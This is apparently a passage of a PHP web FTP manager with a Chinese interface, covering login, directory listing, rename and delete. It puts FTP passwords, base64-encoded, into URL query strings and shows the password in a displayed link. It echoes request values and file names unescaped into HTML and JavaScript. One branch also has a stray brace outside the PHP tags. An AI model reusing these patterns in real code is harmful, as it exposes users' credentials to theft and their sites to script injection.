$style->title("X3193 - FTP");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "ftp.getinfo":
                $tag->getinfo(scriptpath()."?api=ftp&skin=".$skincolor."&urlflag=1&action=".encodeuri("ftp.list")."&page=1&pagesize=".$pagesize,'link','780','500');
                break;
        case "ftp.list":
                if (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        if (trim($_POST["server"]) == "" || trim($_POST["uname"]) == "" || trim($_POST["pwd"]) == ""){
                                AlertBack("服务器名、用户名或密码为空！" , 1);
                                break;
                        }
                        else{
                                AlertBack("服务器名、用户名或密码为空！" , 2);
                                break;
                        }
                }
                If ($_SESSION['ValidCode'] != "" && trim(request("checkcode")) !="" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }               
                }
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("ftp");
}                         

                        $_SESSION["ftp"]=array('server' => '', 'uname' => '', 'pwd' => '');                     
                        //session_register("server"); 
                        //$_SESSION["server"] = "";     
                        //session_register("uname"); 
                        //$_SESSION["uname"] = "";      
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif (trim($_POST["server"]) != "" && trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("ftp");
} 
                        $_SESSION["ftp"]=array('server' => trim(request("server")), 'uname' => trim(request("uname")), 'pwd' => trim(request("pwd")),'port' => trim(request("port")), 'ssl' => trim(request("ssl")), 'pasv' => trim(request("pasv")), 'binary' => trim(request("binary")), 'dir' => trim(request("dir")));                  
                        //session_register("server"); 
                        //$_SESSION["server"] = trim(request("server"));        
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_POST["server"])))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif ($_SESSION["ftp"]["server"] != "" && $_SESSION["ftp"]["uname"] != "" && $_SESSION["ftp"]["pwd"] != "" && trim(request("server")) == "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(base64_encode(trim($_SESSION["ftp"]["server"])))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&port=".trim(request("port")).$skincolor."&dir=".encodeuri("/")."&uname=".encodeuri(base64_encode(trim($_SESSION["ftp"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["ftp"]["pwd"])))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }       
                elseif (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=ftp&skin=".$skincolor."&server=&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }       
                $serverport = trim(request("port"))==""?"21":trim(request("port"));
                if (trim(request("ssl")) == "1"){
                        $conn_id = ftp_ssl_connect(base64_decode(trim(request("server"))),$serverport);
                }
                else{
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))),$serverport);
                }       
                $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                if ((!$conn_id) || (!$login_result)) {
                    AlertBack("FTP登陆失败！" , 2);
                }
                if (trim(request("pasv")) == "1"){
                        ftp_pasv ($conn_id, 1);
                }       
                $contents = ftp_rawlist($conn_id, trim(request("dir")));
                $systype = ftp_systype($conn_id); //"UNIX"; //
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.ftp.chidd'+i))
 {
  eval('document.ftp.chidd'+i).checked = document.ftp.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.ftp.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="ftp" method="post" action="">
        <tr class="tdtbg">
                <td align="center">FTP 空 间 管 理</td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">&nbsp;FTP管理 -> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.list")."&dir=".encodeuri("/")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;">ftp://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("dir"));?></td>
        </tr>
</table>
                <?php 
                if ($systype == "Windows_NT"){
                        //print_r($contents);
                        if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <?php 
                        ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="7%">类型</td>
                                <td align="center">名称</td>
                                <td align="center" width="15%">修改时间</td>
                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">新建</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000;">上传</a> <a style="color:#000000" href="javascript:delitem();">删除</a> 压缩 解压</td>
                        </tr>
                        <?php 
                        $cMaxDir = 0;
                        ?>
                        <?php 
                        foreach ($contents as $current){ 
                                ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if ($split[7]=="<DIR>"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $split[8];?>" /></td>
                                <td align="center">目录</td>
                                <?php 
                                if ($split[8] == "."){
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000"><?php echo ".";?></a></td>

                                }
                                elseif ($split[8] == ".."){
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(substr(trim(request("dir")),0,strripos(trim(request("dir")), "/"))==""?"/":substr(trim(request("dir")),0,strripos(trim(request("dir")), "/")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000"><?php echo "..";?></a></td>
                                <?php       
                                }
                                else{
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir"))=="/"?trim(request("dir")).$split[8]:trim(request("dir"))."/".$split[8])."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000"><?php echo $split[8];?></a></td>
                                <?php 
                                }
                                ?>
                                <td align="center"><?php echo $split[1]."-".$split[2]."-".$split[3]." ".$split[4].":".$split[5].$split[6];?></td>
                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#000000">改名</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">删除</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.view")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">列表</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxDir = $cMaxDir + 1;
                                }
                                unset($current);
                                unset($split);
                        }
                        $cMaxFile = $cMaxDir;
                        foreach ($contents as $current){ 
                                ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if ($split[7]!="<DIR>"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxFile;?>" id="chidd<?php echo $cMaxFile;?>" value="<?php echo $split[8];?>"></td>
                                <td align="center">文件</td>
                                <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.download")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000"><?php echo $split[8];?></a></td>
                                <td align="center"><?php echo $split[1]."-".$split[2]."-".$split[3]." ".$split[4].":".$split[5].$split[6];?></td>
                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#000000">改名</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">删除</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxFile = $cMaxFile + 1;
                                }
                                unset($current);
                                unset($split);
                        }
                        ?>
                </table>
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <tr class="tdbg"> 
                                <td height="21" colspan="5" align="center">
                                        共 <?php echo $cMaxDir;?> 个目录，<?php echo ($cMaxFile-$cMaxDir);?> 个文件 
                                </td>
                        </tr>
                </table>
                <?php 
                }
                elseif ($systype == "UNIX"){
                        //print_r($contents);
                        if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <?php 
                        ?>
                        <tr class="tdbg" width="30%">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="7%">类型</td>
                                <td align="center">名称</td>
                                <td align="center" width="10%">大小</td>
                                <td align="center" width="15%">修改时间</td>
                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">新建</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000;">上传</a> <a style="color:#000000" href="javascript:delitem();">删除</a> 压缩 解压</td>
                        </tr>
                        <?php 
                        $cMaxDir = 0;
                        ?>
                        <?php                       
                        foreach ($contents as $current){ 
                                ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                if (substr($split[1],0,1)=="d"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $split[8];?>"></td>
                                <td align="center">目录</td>
                                <?php 
                                if ($split[8] == "."){
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri("/")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000"><?php echo ".";?></a></td>
                                <?php       
                                }
                                elseif ($split[8] == ".."){
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(substr(trim(request("dir")),0,strripos(trim(request("dir")), "/"))==""?"/":substr(trim(request("dir")),0,strripos(trim(request("dir")), "/")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000"><?php echo "..";?></a></td>
                                <?php       
                                }
                                else{
                                ?>
                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir"))=="/"?trim(request("dir")).$split[8]:trim(request("dir"))."/".$split[8])."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000"><?php echo $split[8];?></a></td>
                                <?php 
                                }
                                ?>      
                                <td align="center"><?php echo $split[5];?></td>
                                <td align="center"><?php echo $split[6]." ".$split[7];?></td>
                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#000000">改名</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">删除</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxDir = $cMaxDir + 1;
                                }
                                unset($current);
                                unset($split);
                        }
                        $cMaxFile = $cMaxDir;
                        foreach ($contents as $current){ 
                                ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                if (substr($split[1],0,1)=="-"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxFile;?>" id="chidd<?php echo $cMaxFile;?>" value="<?php echo $split[8];?>"></td>
                                <td align="center">文件</td>
                                <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.download")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000"><?php echo $split[8];?></a></td>
                                <td align="center"><?php echo $split[5];?></td>
                                <td align="center"><?php echo $split[6]." ".$split[7];?></td>
                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#000000">改名</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">删除</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxFile = $cMaxFile + 1;
                                }
                        }
                        
                        ?>
                </table>
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <tr class="tdbg"> 
                                <td height="21" colspan="5" align="center">
                                        共 <?php echo $cMaxDir;?> 个目录，<?php echo ($cMaxFile-$cMaxDir);?> 个文件 
                                </td>
                        </tr>
                </table>
                <?php 
                }
                ?>
         </td>
     </tr>
</form>
</table>        
                <?php                               
                break;
        case "ftp.remove":
                //print_r($_POST);
                if (trim(request("delok")) == "1"){
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>
        <script language="javascript">
                if(confirm('确定删除选中的<?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>?') == true){
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";
                }       
                else{   
                        alert("该<?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>删除取消！");
                        history.go(-1);
                }       
        </script>
                <?php 
                        break;
                     }
                }
                if (trim(request("type")) != ""){ 
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                        $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                        if ((!$conn_id) || (!$login_result)) {
                                AlertBack("FTP登陆失败！" , 1);
                        }  
                        $contents = ftp_rawlist($conn_id, trim(request("dir")));
                        if (ftp_systype($conn_id) == "Windows_NT"){
                                foreach ($contents as $current){ 
                                        ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                        if (trim(request("type")) == "file"){
                                                if (trim(request("filename")) == $split[8]){
                                                        $flag = "1";
                                                        break;
                                                }
                                        }       
                                        elseif (trim(request("type")) == "dir"){
                                                if (trim(request("dirname")) == $split[8]){
                                                        $flag = "1";
                                                        break;
                                                }
                                        }
                                        
                                        unset($current);
                                        unset($split);
                                }
                                if ($flag == "1"){
                                }
                                else{
                                        AlertBack("该文件或目录不存在！" , 2);
                                        return;
                                }
                        }
                        elseif (ftp_systype($conn_id) == "UNIX"){
                                foreach ($contents as $current){ 
                                        ereg("([^ ]+) +([^ ]+) +([^ ]+) +([^ ]+) +([0-9]+) ([^ ]+ +[0-9]{1,2} +)([0-9]{1,2}[:][0-9]{1,2}|[0-9]+) +(.+)",$current,$split);
                                        if (trim(request("type")) == "file"){
                                                if (trim(request("filename")) == $split[8]){
                                                        $flag = "1";
                                                        break;
                                                }
                                        }       
                                        elseif (trim(request("type")) == "dir"){
                                                if (trim(request("dirname")) == $split[8]){
                                                        $flag = "1";
                                                        break;
                                                }
                                        }
                                        unset($current);
                                        unset($split);
                                }
                                if ($flag == "1"){
                                }
                                else{
                                        AlertBack("该文件或目录不存在！" , 2);
                                        return;
                                }
                        }
                        if (trim(request("type")) == "file"){
                                $msg = @ftp_delete ($conn_id,trim(request("dir"))."/".trim(request("filename")));
                        }
                        elseif (trim(request("type")) == "dir"){
                                $msg = ftp_deldir ($conn_id,trim(request("dir"))."/".trim(request("dirname")));
                        }                       
                }
                elseif (trim(request("type")) == ""){
                        unset($split);
                        unset($contents);
                        $conn_id = ftp_connect(base64_decode(trim(request("server"))));
                        $login_result = ftp_login($conn_id, base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));                
                        if ((!$conn_id) || (!$login_result)) {
                                AlertBack("FTP登陆失败！" , 1);
                        }  
                        $contents = ftp_rawlist($conn_id, trim(request("dir")));
                        $delcount = "0";
                        $msg = "wait";
